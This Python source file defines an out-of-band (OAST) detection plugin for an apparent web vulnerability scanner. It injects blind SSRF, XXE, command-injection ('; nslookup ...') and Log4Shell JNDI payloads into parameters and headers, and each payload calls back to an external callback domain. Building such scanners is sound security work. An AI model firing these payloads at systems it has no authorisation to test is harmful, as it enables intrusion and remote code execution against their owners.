"""OAST (Out-of-Band Application Security Testing) detection plugin.
Uses DNS/HTTP callback mechanism for blind vulnerability detection."""

import asyncio
import uuid
import re
from typing import List, Optional, Dict
import httpx

from plugins.base import BasePlugin
from core.models import Finding, CrawledEndpoint, SeverityLevel, AttackType, AttackPrimitive


class OASTPlugin(BasePlugin):
    name = "oast"
    description = "Out-of-Band testing for blind SSRF, XXE, RCE, and Log4Shell"

    def __init__(self):
        self._callback_domain = None
        self._interactions: Dict[str, dict] = {}
        self._interactsh_client = None

    async def _init_interactsh(self):
        """Initialize interactsh client for OOB callbacks."""
        try:
            from interactsh import InteractshClient
            self._interactsh_client = InteractshClient()
            self._callback_domain = await self._interactsh_client.register()
            return True
        except Exception:
            # Fallback: use a unique DNS name pattern for passive detection
            self._callback_domain = f"crosure-{uuid.uuid4().hex[:8]}.oast.fun"
            return False

    def _generate_tag(self, vuln_type: str, param: str) -> str:
        """Generate unique tag for callback attribution."""
        tag = f"{vuln_type}-{param}-{uuid.uuid4().hex[:6]}"
        return tag

    async def detect(
        self,
        endpoint: CrawledEndpoint,
        session: httpx.AsyncClient,
        context: Optional[dict] = None,
    ) -> List[Finding]:
        findings = []

        params_to_test = {}
        if endpoint.params:
            params_to_test.update(endpoint.params)
        if endpoint.form_data:
            params_to_test.update(endpoint.form_data)

        if not params_to_test:
            return findings

        # Initialize callback domain
        if not self._callback_domain:
            await self._init_interactsh()

        # Generate and inject payloads
        injection_map = {}  # tag → (vuln_type, param, payload)

        for param_name, original_value in params_to_test.items():
            payloads = self._generate_payloads(param_name)

            for vuln_type, payload, tag in payloads:
                injection_map[tag] = (vuln_type, param_name, payload)

                # Inject payload
                if endpoint.method == "POST" and endpoint.form_data:
                    data = dict(endpoint.form_data)
                    data[param_name] = payload
                    await self._send_request(session, endpoint.url, method="POST", data=data)
                else:
                    params = dict(endpoint.params) if endpoint.params else {}
                    params[param_name] = payload
                    await self._send_request(session, endpoint.url, params=params)

        # Also inject into headers
        header_payloads = self._generate_header_payloads()
        for header_name, payload, tag, vuln_type in header_payloads:
            injection_map[tag] = (vuln_type, f"header:{header_name}", payload)
            headers = {header_name: payload}
            await self._send_request(session, endpoint.url, headers=headers)

        # Wait for callbacks
        await asyncio.sleep(8)

        # Poll for interactions
        if self._interactsh_client:
            try:
                interactions = await self._interactsh_client.poll()
                for interaction in interactions:
                    # Match interaction to injection
                    full_host = interaction.get("full-id", "")
                    for tag, (vuln_type, param, payload) in injection_map.items():
                        if tag in full_host:
                            protocol = interaction.get("protocol", "dns")
                            findings.append(Finding(
                                vuln_type=self._map_vuln_type(vuln_type),
                                severity=SeverityLevel.HIGH if vuln_type != "log4shell" else SeverityLevel.CRITICAL,
                                url=endpoint.url,
                                method=endpoint.method,
                                parameter=param,
                                payload=payload,
                                evidence=f"OOB callback received via {protocol}: {full_host}",
                                description=f"Blind {vuln_type} confirmed via out-of-band {protocol} interaction. Server made external request to attacker-controlled domain.",
                                cvss_score=8.6 if vuln_type != "log4shell" else 10.0,
                                owasp_category=self._map_owasp(vuln_type),
                                primitive=AttackPrimitive.CODE_EXEC if vuln_type in ("rce", "log4shell") else AttackPrimitive.DATA_ACCESS,
                            ))
                            break
            except Exception:
                pass

        return findings

    def _generate_payloads(self, param_name: str) -> list:
        """Generate OAST payloads with unique tags."""
        payloads = []
        if not self._callback_domain:
            return payloads

        # Blind SSRF
        tag = self._generate_tag("ssrf", param_name)
        payloads.append((
            "ssrf",
            f"http://{tag}.{self._callback_domain}/ssrf",
            tag,
        ))

        # Blind XXE
        tag = self._generate_tag("xxe", param_name)
        payloads.append((
            "xxe",
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{tag}.{self._callback_domain}/xxe">]><foo>&xxe;</foo>',
            tag,
        ))

        # Blind RCE (command injection)
        tag = self._generate_tag("rce", param_name)
        payloads.append((
            "rce",
            f"; nslookup {tag}.{self._callback_domain} ;",
            tag,
        ))

        # Log4Shell
        tag = self._generate_tag("log4shell", param_name)
        payloads.append((
            "log4shell",
            f"${{jndi:ldap://{tag}.{self._callback_domain}/log4j}}",
            tag,
        ))

        return payloads

    def _generate_header_payloads(self) -> list:
        """Generate OAST payloads for injection via headers."""
        payloads = []
        if not self._callback_domain:
            return payloads

        # Log4Shell via common headers
        for header in ["X-Forwarded-For", "User-Agent", "Referer", "X-Api-Version"]:
            tag = self._generate_tag("log4shell", header)
            payloads.append((
                header,
                f"${{jndi:ldap://{tag}.{self._callback_domain}/log4j}}",
                tag,
                "log4shell",
            ))

        return payloads

    def _map_vuln_type(self, vuln_type: str) -> AttackType:
        mapping = {
            "ssrf": AttackType.SSRF,
            "xxe": AttackType.OTHER,
            "rce": AttackType.COMMAND_INJECTION,
            "log4shell": AttackType.RCE,
        }
        return mapping.get(vuln_type, AttackType.OAST)

    def _map_owasp(self, vuln_type: str) -> str:
        mapping = {
            "ssrf": "A10:2021 - Server-Side Request Forgery",
            "xxe": "A03:2021 - Injection",
            "rce": "A03:2021 - Injection",
            "log4shell": "A06:2021 - Vulnerable and Outdated Components",
        }
        return mapping.get(vuln_type, "A03:2021 - Injection")
